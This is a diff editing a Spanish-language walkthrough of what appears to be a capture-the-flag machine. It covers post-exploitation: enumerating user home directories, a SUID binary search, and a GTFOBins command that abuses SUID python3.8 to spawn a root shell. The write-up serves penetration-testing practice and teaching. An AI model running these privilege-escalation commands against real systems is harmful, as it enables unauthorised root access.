@@ -118,7 +118,7 @@ Ahora corremos nuestra RevShell/WebShell desde el navegador:
 
 * `whoami` ==> `root`. Funcionó!
  
-Ahora a mejorar la TTY:
+Ahora a **Mejorar la TTY**:
 
 ```
 which python python3
@@ -131,16 +131,16 @@ Ahora ya comprobamos que tenemos una PTY funcional.
 ___
 		 
 #### FASE POST-EXPLOTACIÓN (Elevar Privilegios)
-Ahora que ya tenemos acceso al sistema en un entorno más controlado y funcional pasamos a:  
+Ya que tenemos acceso al sistema en un entorno más cómodo y controlado, pasamos a:  
 
-* Enumerar Home de Usuarios:
+* Enumerar Home de Usuarios (puede haber más):
     * ls -Ral /home
         * negan
         * rick
         * wwdata
         * www-data
 
-Nuestro usuario (www-data) parece tener un script que podría ser explotable: `/home/www-data/hijack.py`. Hacemos:
+Nuestro usuario (www-data) parece tener un script que podría ser explotable: `/home/www-data/hijack.py`. Debemos ver su lógica. Hacemos:
 
 ```
 cat /home/www-data/hijack.py
@@ -153,34 +153,35 @@ cat /home/www-data/hijack.py
 
 ```
 cat /usr/local/bin/wwwdata_vuln
--e #!/bin/bash                 
-/bin/bash                      
+>>-e #!/bin/bash                 
+>>/bin/bash                      
 ```
 
 Haciendo varios intentos, nos damos cuenta que en realidad este no es el camino, son distracciones, por lo cual debemos ir por otro lado.
 
-Hacemos una **Búsqueda de Binarios SUID:**
-Una de las primera cosas que hay probar **Elevar Privilegios** es hallar estos binarios:
+**Búsqueda de Binarios SUID:**
+Una de las primera cosas que hay probar para **Elevar Privilegios** apenas entramos al sistema, es hallar estos binarios:
 
 ```
-find / -type f -perm -4000 2>/dev/nullusr/lib/openssh/ssh-keysign               
-	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-	/usr/bin/man                               
-	/usr/bin/gpasswd                           
-	/usr/bin/mount                             
-	/usr/bin/umount                            
-	/usr/bin/chfn                              
-	/usr/bin/passwd                            
-	/usr/bin/su                                
-	/usr/bin/newgrp                            
-	/usr/bin/chsh                              
-	/usr/bin/python3.8 <===                        
-	/usr/bin/sudo                           
-
-Vamos GTFOBins y terminamos corriendo:
+find / -type f -perm -4000 2>/dev/null
+>>/usr/lib/openssh/ssh-keysign               
+>>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+>>/usr/bin/man                               
+>>/usr/bin/gpasswd                           
+>>/usr/bin/mount                             
+>>/usr/bin/umount                            
+>>/usr/bin/chfn                              
+>>/usr/bin/passwd                            
+>>/usr/bin/su                                
+>>/usr/bin/newgrp                            
+>>/usr/bin/chsh                              
+>>/usr/bin/python3.8 <===                        
+>>/usr/bin/sudo                           
+```
+Vemos que `python3.` está muy interesanto. Vamos aGTFOBins, comprobamos que es vulnerable a _Explotación SUID_ y terminamos corriendo:
 * `/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
 
-`whoami` y somos `root`.
+Hacemos `whoami` y comprobamos que somos `root`. Eso es todo!
 
 ___
 
